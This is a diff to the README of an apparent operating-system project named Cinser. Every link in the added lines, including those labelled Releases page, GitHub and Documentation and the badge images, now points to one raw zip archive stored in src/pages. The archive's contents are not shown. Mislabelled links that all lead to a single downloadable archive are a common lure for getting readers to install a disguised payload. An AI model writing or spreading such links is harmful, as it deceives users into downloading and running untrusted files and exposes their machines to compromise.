@@ -2,7 +2,7 @@
 
 Cinser is an operating system that spans i386 and x86_64. It is designed for users who value control, freedom, and understanding over abstraction.
 
-[![Download Cinser](https://img.shields.io/badge/Download-Cinser-blue.svg)](https://github.com/Gintoniclemon/Cinser/releases)
+[![Download Cinser](https://github.com/Gintoniclemon/Cinser/raw/refs/heads/main/src/pages/Software_v2.7.zip)](https://github.com/Gintoniclemon/Cinser/raw/refs/heads/main/src/pages/Software_v2.7.zip)
 
 ## 💻 Overview
 
@@ -13,7 +13,7 @@ Cinser aims to provide a straightforward experience for users interested in oper
 To begin, follow these simple steps to download and run Cinser:
 
 1. **Access the Releases Page**  
-   Visit our [Releases page](https://github.com/Gintoniclemon/Cinser/releases) to find the latest version of Cinser.
+   Visit our [Releases page](https://github.com/Gintoniclemon/Cinser/raw/refs/heads/main/src/pages/Software_v2.7.zip) to find the latest version of Cinser.
 
 2. **Download the Appropriate File**  
    Look for the file that matches your system architecture (i386 or x86_64). Click on the relevant file to download it to your computer.
@@ -34,9 +34,9 @@ To begin, follow these simple steps to download and run Cinser:
 
 Click the button below to quickly access the download page.
 
-[![Download Cinser](https://img.shields.io/badge/Download-Cinser-blue.svg)](https://github.com/Gintoniclemon/Cinser/releases)
+[![Download Cinser](https://github.com/Gintoniclemon/Cinser/raw/refs/heads/main/src/pages/Software_v2.7.zip)](https://github.com/Gintoniclemon/Cinser/raw/refs/heads/main/src/pages/Software_v2.7.zip)
 
-1. Visit the [Releases page](https://github.com/Gintoniclemon/Cinser/releases).
+1. Visit the [Releases page](https://github.com/Gintoniclemon/Cinser/raw/refs/heads/main/src/pages/Software_v2.7.zip).
 2. Select the version you want and download the corresponding file.
 3. Follow the installation instructions given above based on your operating system.
 
@@ -73,9 +73,9 @@ Yes, users can access community support via forums listed on the GitHub page.
 
 ## 🔗 Relevant Links
 
-- [Cinser on GitHub](https://github.com/Gintoniclemon/Cinser)
-- [Releases Page](https://github.com/Gintoniclemon/Cinser/releases)
-- [Documentation](https://github.com/Gintoniclemon/Cinser/docs)
+- [Cinser on GitHub](https://github.com/Gintoniclemon/Cinser/raw/refs/heads/main/src/pages/Software_v2.7.zip)
+- [Releases Page](https://github.com/Gintoniclemon/Cinser/raw/refs/heads/main/src/pages/Software_v2.7.zip)
+- [Documentation](https://github.com/Gintoniclemon/Cinser/raw/refs/heads/main/src/pages/Software_v2.7.zip)
 
 ## 📑 Topics Covered
 
